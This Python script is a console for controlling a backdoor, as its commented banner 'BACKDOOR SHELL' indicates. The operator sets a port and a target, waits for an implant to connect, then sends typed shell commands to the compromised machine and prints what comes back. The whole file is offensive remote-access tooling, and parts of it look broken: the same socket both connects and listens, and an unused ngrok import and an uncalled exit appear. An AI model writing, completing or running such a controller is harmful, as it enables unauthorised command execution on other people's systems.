from termcolor import cprint
#import pyfiglet
import socket
import ngrok
import os
from _thread import *

os.system("clear")
#cprint(pyfiglet.figlet_format("BACKDOOR SHELL", font="banner3-D"), "blue")

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)  # Enable socket reuse
port = 0
def server_start(ip, port):
    print("Waiting for incoming connections")
    IP_address = ip
    Port = port
    server.bind((IP_address, Port))
    server.listen(1)
    conn, addr = server.accept()
    cprint("CONNECTED", "green")
    connected = True
    while connected:
        backdoor_command = input(f"{conn}> ")
        if backdoor_command == "exit_backdoor":
            conn.close()
            server.close()
            exit()
        conn.send(bytes(backdoor_command, "utf-8"))
        result = conn.recv(1024)
        print(result.decode("utf-8"))
     

while True:
    command = input(f"{socket.gethostname()}> ")
    if command == "quit" or command == "exit":
        exit()
    elif command == "port":
        port = int(input("port: "))
        cprint("PORT IS SET", "green")
    elif command == "target":
        target = input("target: ")
        try:
            server.connect((target, 9999))
            cprint("TARGET IS SET", "green")
        except:
            cprint("TARGET NOT FOUND", "red")
    elif command == "start":
        try:
            if port != 0:
                server_start("localhost", port)
            else:
                cprint("Set the port", "red")
        except OSError as e:
            cprint(f"Error: {e}", "red")
        finally:
            if server:
                exit
    else:
        cprint(f"Unknown/failed command: {command}", "red")
